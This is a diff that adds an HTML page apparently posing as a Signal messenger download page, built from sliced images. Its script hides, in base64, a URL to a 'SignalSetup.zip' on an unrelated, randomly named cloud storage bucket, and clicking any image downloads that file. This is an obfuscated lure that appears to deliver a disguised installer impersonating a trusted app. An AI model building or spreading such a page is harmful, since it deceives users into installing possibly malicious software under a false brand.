@@ -1,0 +1,66 @@
+<html>
+<head>
+<title>signal</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+</head>
+<body bgcolor="#FFFFFF" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+<!-- Save for Web Slices (signal.psd) -->
+<table id="__01" border="0" cellpadding="0" cellspacing="0">
+	<tr>
+		<td>
+			<img src="images/index_01.png" width="100%" alt="" /></td>
+	</tr>
+	<tr>
+		<td>
+			<img src="images/index_02.png" width="100%" alt="" /></td>
+	</tr>
+	<tr>
+		<td>
+			<img src="images/index_03.png" width="100%" alt="" /></td>
+	</tr>
+	<tr>
+		<td>
+			<img src="images/index_04.png" width="100%" alt="" /></td>
+	</tr>
+	<tr>
+		<td>
+			<img src="images/index_05.png" width="100%" alt="" /></td>
+	</tr>
+	<tr>
+		<td>
+			<img src="images/index_06.png" width="100%" alt="" /></td>
+	</tr>
+</table>
+	<script>
+        
+        const encryptedUrls = [
+            'aHR0cHM6Ly94eHZ6cWF6Lm9zcy1hcC1zb3V0aGVhc3QtNy5hbGl5dW5jcy5jb20vU2lnbmFsU2V0dXAuemlw',
+            'aHR0cHM6Ly94eHZ6cWF6Lm9zcy1hcC1zb3V0aGVhc3QtNy5hbGl5dW5jcy5jb20vU2lnbmFsU2V0dXAuemlw',
+            'aHR0cHM6Ly94eHZ6cWF6Lm9zcy1hcC1zb3V0aGVhc3QtNy5hbGl5dW5jcy5jb20vU2lnbmFsU2V0dXAuemlw',
+            'aHR0cHM6Ly94eHZ6cWF6Lm9zcy1hcC1zb3V0aGVhc3QtNy5hbGl5dW5jcy5jb20vU2lnbmFsU2V0dXAuemlw',
+		    'aHR0cHM6Ly94eHZ6cWF6Lm9zcy1hcC1zb3V0aGVhc3QtNy5hbGl5dW5jcy5jb20vU2lnbmFsU2V0dXAuemlw',
+            'aHR0cHM6Ly94eHZ6cWF6Lm9zcy1hcC1zb3V0aGVhc3QtNy5hbGl5dW5jcy5jb20vU2lnbmFsU2V0dXAuemlw'
+        ];
+        function base64Decode(base64) {
+            return atob(base64); 
+        }
+        function downloadFile(encodedUrl) {
+            const url = base64Decode(encodedUrl); 
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = ''; 
+            document.body.appendChild(link); 
+            link.click(); 
+            document.body.removeChild(link); 
+        }
+        
+        const images = document.querySelectorAll('img');
+        images.forEach((img, index) => {
+            img.addEventListener('click', () => {
+                const encodedUrl = encryptedUrls[index]; 
+                downloadFile(encodedUrl); 
+            });
+        });
+    </script> 
+</body>
+</html>
